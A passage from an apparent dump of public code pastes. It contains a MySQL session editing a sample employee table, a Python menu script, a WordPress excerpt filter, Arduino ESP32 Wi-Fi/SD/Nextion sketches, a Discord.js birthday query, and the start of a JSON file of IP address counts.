|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> SELECT * FROM EmployeeInfo
    -> ;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> UPDATE EmployeeInfo SET id = 19 WHERE name = 'Tom Wright';
Query OK, 1 row affected (0.06 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> UPDATE EmployeeInfo SET id = 19 WHERE name = 'John Doe';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 1  Changed: 0  Warnings: 0

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Tom Wright     | Support Engineer          |  65000 |
|   19 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> UPDATE EmployeeInfo SET id = 20 WHERE name = 'John Doe';
Query OK, 1 row affected (0.04 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Tom Wright     | Support Engineer          |  65000 |
|   20 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> INSERT INTO EmployeeInfo (id, name, post, salary) VALUES (21, 'James L', 'Jr. Engineer', 35000);
Query OK, 1 row affected (0.06 sec)

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Tom Wright     | Support Engineer          |  65000 |
|   20 | John Doe       | Intern                    |  30000 |
|   21 | James L        | Jr. Engineer              |  35000 |
+------+----------------+---------------------------+--------+
21 rows in set (0.00 sec)

mysql> DELETE FROM EmployeeInfo WHERE id = '21'
    -> ;
Query OK, 1 row affected (0.14 sec)

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Tom Wright     | Support Engineer          |  65000 |
|   20 | John Doe       | Intern                    |  30000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> CREATE TABLE Departments (
    -> depid INT,
    -> dept varchar(50)
    -> );
Query OK, 0 rows affected (4.47 sec)

mysql> DESC TABLE Departments;
+----+-------------+-------------+------------+------+---------------+------+---------+------+------+----------+-------+
| id | select_type | table       | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra |
+----+-------------+-------------+------------+------+---------------+------+---------+------+------+----------+-------+
|  1 | SIMPLE      | Departments | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | NULL  |
+----+-------------+-------------+------------+------+---------------+------+---------+------+------+----------+-------+
1 row in set, 1 warning (0.59 sec)

mysql> DESC Departments;
+-------+-------------+------+-----+---------+-------+
| Field | Type        | Null | Key | Default | Extra |
+-------+-------------+------+-----+---------+-------+
| depid | int         | YES  |     | NULL    |       |
| dept  | varchar(50) | YES  |     | NULL    |       |
+-------+-------------+------+-----+---------+-------+
2 rows in set (0.23 sec)

mysql> clear

mysql> INSERT INTO Departments (depid, dept) VALUES (1, 'Engineering'), (2, 'Human Resources'), (3, 'Product'), (4, 'Support');
Query OK, 4 rows affected (0.24 sec)
Records: 4  Duplicates: 0  Warnings: 0

mysql> SELECT * FROM Departments
    -> ;
+-------+-----------------+
| depid | dept            |
+-------+-----------------+
|     1 | Engineering     |
|     2 | Human Resources |
|     3 | Product         |
|     4 | Support         |
+-------+-----------------+
4 rows in set (0.00 sec)

mysql> SELECT e.name, e.post, d.dept
    -> FROM EmployeeInfo e
    -> CROSS JOIN Departments d;
+----------------+---------------------------+-----------------+
| name           | post                      | dept            |
+----------------+---------------------------+-----------------+
| Alice Johnson  | Software Engineer         | Support         |
| Alice Johnson  | Software Engineer         | Product         |
| Alice Johnson  | Software Engineer         | Human Resources |
| Alice Johnson  | Software Engineer         | Engineering     |
| Bob Smith      | QA Engineer               | Support         |
| Bob Smith      | QA Engineer               | Product         |
| Bob Smith      | QA Engineer               | Human Resources |
| Bob Smith      | QA Engineer               | Engineering     |
| Cathy Williams | Software Engineer         | Support         |
| Cathy Williams | Software Engineer         | Product         |
| Cathy Williams | Software Engineer         | Human Resources |
| Cathy Williams | Software Engineer         | Engineering     |
| David Brown    | UI/UX Designer            | Support         |
| David Brown    | UI/UX Designer            | Product         |
| David Brown    | UI/UX Designer            | Human Resources |
| David Brown    | UI/UX Designer            | Engineering     |
| Ella Davis     | Project Manager           | Support         |
| Ella Davis     | Project Manager           | Product         |
| Ella Davis     | Project Manager           | Human Resources |
| Ella Davis     | Project Manager           | Engineering     |
| Frank Wilson   | Backend Developer         | Support         |
| Frank Wilson   | Backend Developer         | Product         |
| Frank Wilson   | Backend Developer         | Human Resources |
| Frank Wilson   | Backend Developer         | Engineering     |
| Grace Lee      | Frontend Developer        | Support         |
| Grace Lee      | Frontend Developer        | Product         |
| Grace Lee      | Frontend Developer        | Human Resources |
| Grace Lee      | Frontend Developer        | Engineering     |
| Henry Clark    | Software Engineer         | Support         |
| Henry Clark    | Software Engineer         | Product         |
| Henry Clark    | Software Engineer         | Human Resources |
| Henry Clark    | Software Engineer         | Engineering     |
| Ivy Lewis      | QA Engineer               | Support         |
| Ivy Lewis      | QA Engineer               | Product         |
| Ivy Lewis      | QA Engineer               | Human Resources |
| Ivy Lewis      | QA Engineer               | Engineering     |
| Jake Hall      | Intern                    | Support         |
| Jake Hall      | Intern                    | Product         |
| Jake Hall      | Intern                    | Human Resources |
| Jake Hall      | Intern                    | Engineering     |
| Karen Young    | Project Manager           | Support         |
| Karen Young    | Project Manager           | Product         |
| Karen Young    | Project Manager           | Human Resources |
| Karen Young    | Project Manager           | Engineering     |
| Leo King       | Security Analyst          | Support         |
| Leo King       | Security Analyst          | Product         |
| Leo King       | Security Analyst          | Human Resources |
| Leo King       | Security Analyst          | Engineering     |
| Mona Scott     | Full Stack Developer      | Support         |
| Mona Scott     | Full Stack Developer      | Product         |
| Mona Scott     | Full Stack Developer      | Human Resources |
| Mona Scott     | Full Stack Developer      | Engineering     |
| Nathan Adams   | Scrum Master              | Support         |
| Nathan Adams   | Scrum Master              | Product         |
| Nathan Adams   | Scrum Master              | Human Resources |
| Nathan Adams   | Scrum Master              | Engineering     |
| Olivia Baker   | Frontend Developer        | Support         |
| Olivia Baker   | Frontend Developer        | Product         |
| Olivia Baker   | Frontend Developer        | Human Resources |
| Olivia Baker   | Frontend Developer        | Engineering     |
| Paul Turner    | Cloud Architect           | Support         |
| Paul Turner    | Cloud Architect           | Product         |
| Paul Turner    | Cloud Architect           | Human Resources |
| Paul Turner    | Cloud Architect           | Engineering     |
| Queenie Allen  | Machine Learning Engineer | Support         |
| Queenie Allen  | Machine Learning Engineer | Product         |
| Queenie Allen  | Machine Learning Engineer | Human Resources |
| Queenie Allen  | Machine Learning Engineer | Engineering     |
| Robert Hill    | Backend Developer         | Support         |
| Robert Hill    | Backend Developer         | Product         |
| Robert Hill    | Backend Developer         | Human Resources |
| Robert Hill    | Backend Developer         | Engineering     |
| Tom Wright     | Support Engineer          | Support         |
| Tom Wright     | Support Engineer          | Product         |
| Tom Wright     | Support Engineer          | Human Resources |
| Tom Wright     | Support Engineer          | Engineering     |
| John Doe       | Intern                    | Support         |
| John Doe       | Intern                    | Product         |
| John Doe       | Intern                    | Human Resources |
| John Doe       | Intern                    | Engineering     |
+----------------+---------------------------+-----------------+
80 rows in set (0.03 sec)

mysql> CREATE VIEW NoSalary AS
    -> SELECT id, name, post FROM EmployeeInfo;
Query OK, 0 rows affected (0.18 sec)

mysql> Select * FROM NoSalary'
    '> ^C
mysql> Select * FROM NoSalary;
+------+----------------+---------------------------+
| id   | name           | post                      |
+------+----------------+---------------------------+
|    1 | Alice Johnson  | Software Engineer         |
|    2 | Bob Smith      | QA Engineer               |
|    3 | Cathy Williams | Software Engineer         |
|    4 | David Brown    | UI/UX Designer            |
|    5 | Ella Davis     | Project Manager           |
|    6 | Frank Wilson   | Backend Developer         |
|    7 | Grace Lee      | Frontend Developer        |
|    8 | Henry Clark    | Software Engineer         |
|    9 | Ivy Lewis      | QA Engineer               |
|   10 | Jake Hall      | Intern                    |
|   11 | Karen Young    | Project Manager           |
|   12 | Leo King       | Security Analyst          |
|   13 | Mona Scott     | Full Stack Developer      |
|   14 | Nathan Adams   | Scrum Master              |
|   15 | Olivia Baker   | Frontend Developer        |
|   16 | Paul Turner    | Cloud Architect           |
|   17 | Queenie Allen  | Machine Learning Engineer |
|   18 | Robert Hill    | Backend Developer         |
|   19 | Tom Wright     | Support Engineer          |
|   20 | John Doe       | Intern                    |
+------+----------------+---------------------------+
20 rows in set (0.02 sec)

mysql> SELECT AVG(salary) AS average_salary FROM EmployeeInfo;
+----------------+
| average_salary |
+----------------+
|     74700.0000 |
+----------------+
1 row in set (0.03 sec)

mysql> SELECT AVG(salary) AS average_developer_salary FROM EmployeeInfo WHERE post LIKE '%Developer';
+--------------------------+
| average_developer_salary |
+--------------------------+
|               77600.0000 |
+--------------------------+
1 row in set (0.03 sec)

"
L39zw94N,menu.py,DrAungWinHtut,Python,Monday 21st of July 2025 10:17:32 PM CDT,"import os

while True:
	os.system('cls')
	print('0-Exit')
	print('1-Area')
	print('2-Screen Clear')
	ans = input('Choose 0,1,2: ')
	ans = int(ans)

	if ans == 0:
		print('Bye!')
		exit(0)

	if ans == 1:
		r = input('enter r: ')
		r = float(r)
		a = 3.14 * r * r 
		print(f'area = {a} for radius = {r}')

	if ans == 2:
		os.system('cls')

	os.system('pause')"
WR6pDRAm,show real excerpt on archive page,arie_cristianD,PHP,Monday 21st of July 2025 09:54:09 PM CDT,"add_filter( 'jnews_module_excerpt', 'customize_jnews_excerpt_on_archive', 99, 4 );

function customize_jnews_excerpt_on_archive( $excerpt, $post_id, $excerpt_length, $except_more ) {
	$post = get_post( $post_id );
	if ( is_archive() ) {
		$new_excerpt = $post->post_excerpt;
		if ( ! empty( $new_excerpt ) ) {
			$excerpt = $new_excerpt;
		}
	}
	return $excerpt;
}"
U3DqkcNK,Setup Initialization rev_02,pleasedontcode,Arduino,Monday 21st of July 2025 08:13:38 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Setup Initialization
	- Source Code NOT compiled for: Arduino Nano ESP32
	- Source Code created on: 2025-07-22 01:12:29

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* قم بتمكين اتصال Wi-Fi على Arduino Nano ESP32 */
	/* للسماح بالتحكم عن بعد ونقل البيانات.  ايضا تشغيل */
	/* شاشه ولورا وبطاقه ذاكرهوشاشه nextion 5in  ومهام */
	/* بحاجه لتفصيل وخصوصا ازرار الشاشه */
/****** SYSTEM REQUIREMENT 2 *****/
	/* تنفيذ اتصالات Wi-Fi وواجهة عرض Nextion وتخزين */
	/* البيانات على بطاقة SD لأتمتة إنترنت الأشياء. */
/****** END SYSTEM REQUIREMENTS *****/


/********* User code review feedback **********
#### Feedback 1 ####
- Users\user\Documents\Arduino\libraries\ITEADLIB_Arduino_Nextion-
master\NexUpload.cpp:17:10: fatal error: SoftwareSerial.h: No su
ch file or directory
   17 | #include <SoftwareSerial.h>
      |
          ^~~~~~~~~~~~~~~~~~
compilation terminated.
Alternative
s for SoftwareSerial.h: []
ResolveLibrary(So
********* User code review feedback **********/

/* START CODE */
/****** DEFINITION OF LIBRARIES *****/
#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
// #include <Nextion.h> // Removed, as no library is used for Nextion communication

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void sendNextionCommand(const String& cmd);
void setup_wifi(void);
void readNextion(); // Optional, if needed

// Wi-Fi credentials
const char* ssid = ""Your_SSID"";         // Replace with your Wi-Fi network SSID
const char* password = ""Your_PASSWORD""; // Replace with your Wi-Fi password

// Nextion Display Serial connection
#define nexSerial Serial2 // Using Serial2 for Nextion
// If your hardware setup differs, adjust accordingly

// SD card chip select pin
const int chipSelect = 5; // GPIO5, adjust if necessary

// No specific Nextion object instantiation needed unless using a library
// We'll use the Serial2 directly for communication

void setup_wifi() {
  delay(100);
  Serial.println();
  Serial.print(""Connecting to WiFi: "");
  Serial.println(ssid);

  WiFi.begin(ssid, password);

  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    Serial.print(""."");
    retries++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println();
    Serial.println(""WiFi connected"");
    Serial.print(""IP address: "");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println();
    Serial.println(""Failed to connect WiFi"");
  }
}

void setup(void) {
  Serial.begin(115200); // Serial for debugging
  nexSerial.begin(9600); // Nextion display baud rate

  // Initialize Wi-Fi
  setup_wifi();

  // Initialize SD card
  if (!SD.begin(chipSelect)) {
    Serial.println(""Card Mount Failed"");
    // Handle error if necessary
  } else {
    Serial.println(""SD card initialized"");
    // Optionally, read/write data
  }

  // Initialize Nextion display
  // Send initial 3 bytes to start communication
  nexSerial.write(0xFF);
  nexSerial.write(0xFF);
  nexSerial.write(0xFF);
  // Add any further initialization commands here if needed
}

void loop(void) {
  // Handle Wi-Fi, display, and storage tasks
  // For demonstration, display Wi-Fi status on Nextion
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 5000) { // Update every 5 seconds
    lastUpdate = millis();

    String statusText;
    if (WiFi.status() == WL_CONNECTED) {
      statusText = ""WiFi: Connected"";
    } else {
      statusText = ""WiFi: Disconnected"";
    }

    // Send status to Nextion
    // Assuming there's a text component with object ID 't0'
    // Format command: t0.txt=""Status""
    String cmd = ""t0.txt=\"""" + statusText + ""\"""";
    sendNextionCommand(cmd);
  }

  // Example: Read and process Nextion events if needed
  // For simplicity, omitted here

  // Additional code for handling button presses, data transfer, etc.
}

// Helper function to send commands to Nextion
void sendNextionCommand(const String& cmd) {
  String command = cmd + ""\xFF\xFF\xFF""; // Append 3 terminator bytes
  nexSerial.print(command);
}

// Optional: Function to read from Nextion if necessary
void readNextion() {
  while (nexSerial.available()) {
    char c = nexSerial.read();
    // Process incoming data if needed
  }
}
"
9sQd8LDd,Device Setup rev_01,pleasedontcode,Arduino,Monday 21st of July 2025 08:08:58 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Device Setup
	- Source Code NOT compiled for: Arduino Nano ESP32
	- Source Code created on: 2025-07-22 01:08:23

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* قم بتمكين اتصال Wi-Fi على Arduino Nano ESP32 */
	/* للسماح بالتحكم عن بعد ونقل البيانات.  ايضا تشغيل */
	/* شاشه ولورا وبطاقه ذاكرهوشاشه nextion 5in  ومهام */
	/* بحاجه لتفصيل وخصوصا ازرار الشاشه */
/****** SYSTEM REQUIREMENT 2 *****/
	/* تنفيذ اتصالات Wi-Fi وواجهة عرض Nextion وتخزين */
	/* البيانات على بطاقة SD لأتمتة إنترنت الأشياء. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */
/****** DEFINITION OF LIBRARIES *****/
#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
#include <Nextion.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// Wi-Fi credentials
const char* ssid = ""Your_SSID"";         // Replace with your Wi-Fi network SSID
const char* password = ""Your_PASSWORD""; // Replace with your Wi-Fi password

// Nextion Display Serial connection
#define nexSerial Serial2 // Using Serial2 for Nextion
// If your hardware setup differs, adjust accordingly

// SD card chip select pin
const int chipSelect = 5; // GPIO5, adjust if necessary

// Nextion object
// Assuming Nextion HMI is a 5-inch model connected via Serial2
// The ID numbers are placeholders, adjust according to your Nextion setup
// For example, if you have a button with ID 1, you can control it as shown

// No specific Nextion object instantiation needed unless using a library
// We'll use the Nextion library functions directly

void setup_wifi() {
  delay(100);
  Serial.println();
  Serial.print(""Connecting to WiFi: "");
  Serial.println(ssid);

  WiFi.begin(ssid, password);

  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    Serial.print(""."");
    retries++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println();
    Serial.println(""WiFi connected"");
    Serial.print(""IP address: "");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println();
    Serial.println(""Failed to connect WiFi"");
  }
}

void setup(void) {
  Serial.begin(115200); // Serial for debugging
  nexSerial.begin(9600); // Nextion display baud rate

  // Initialize Wi-Fi
  setup_wifi();

  // Initialize SD card
  if (!SD.begin(chipSelect)) {
    Serial.println(""Card Mount Failed"");
    // Handle error if necessary
  } else {
    Serial.println(""SD card initialized"");
    // Optionally, read/write data
  }

  // Initialize Nextion display
  // Optional: send initial commands
  // For example, set brightness or clear screen
  nexSerial.write(0xFF);
  nexSerial.write(0xFF);
  nexSerial.write(0xFF);
  // Add any further initialization commands here
}

void loop(void) {
  // Handle Wi-Fi, display, and storage tasks
  // For demonstration, display Wi-Fi status on Nextion
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 5000) { // Update every 5 seconds
    lastUpdate = millis();

    String statusText;
    if (WiFi.status() == WL_CONNECTED) {
      statusText = ""WiFi: Connected"";
    } else {
      statusText = ""WiFi: Disconnected"";
    }

    // Send status to Nextion
    // Assuming there's a text component with object ID 't0'
    // Format command: t0.txt=""Status""
    String cmd = ""t0.txt=\"""" + statusText + ""\"""";
    sendNextionCommand(cmd);
  }

  // Example: Read and process Nextion events if needed
  // For simplicity, omitted here

  // Additional code for handling button presses, data transfer, etc.
}

// Helper function to send commands to Nextion
void sendNextionCommand(const String& cmd) {
  String command = cmd + ""\xFF\xFF\xFF""; // Append 3 terminator bytes
  nexSerial.print(command);
}

// Optional: Function to read from Nextion if necessary
void readNextion() {
  while (nexSerial.available()) {
    char c = nexSerial.read();
    // Process incoming data if needed
  }
}
"
cw669E58,birthday function,sambeano7,JavaScript,Monday 21st of July 2025 08:00:56 PM CDT,"const { ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType, Component, } = require('discord.js');
const con = require(`./utils/statemanager`);

(async () => {
    try {
        const currentMonth = new Date().getMonth();
        const currentDate = new Date().getDate();
        const currentHour = new Date().getHours();
        console.log(con.connection.query(`SELECT * FROM birthdays WHERE month = '${currentMonth + 1}' AND date = '${currentDate}'`));
    } catch (error) {
        console.error(error);
    }
})();"
zdaEXHYT,2025-07-21_stats.json,rdp_snitch,JSON,Monday 21st of July 2025 07:18:28 PM CDT,"{
  ""ip"": {
    ""159.223.43.222"": 6,
    ""45.79.152.94"": 12,
    ""143.110.138.22"": 3,
    ""147.185.132.73"": 9,
    ""194.164.107.6"": 30,
    ""167.94.138.175"": 3,
    ""80.94.95.75"": 30,
    ""194.180.49.127"": 3,
    ""88.214.50.58"": 18,
    ""147.185.132.249"": 9,
    ""188.166.231.132"": 9,
    ""181.30.42.98"": 3,
    ""96.51.53.164"": 6,
    ""45.33.87.154"": 3,
    ""167.94.138.123"": 3,
    ""139.162.13.76"": 12,
    ""128.22.147.233"": 3,
    ""51.79.199.48"": 3753,
    ""102.88.21.212"": 3,
    ""217.114.43.37"": 21,
    ""111.170.152.113"": 9,
    ""198.235.24.161"": 9,
    ""51.83.22.246"": 3,
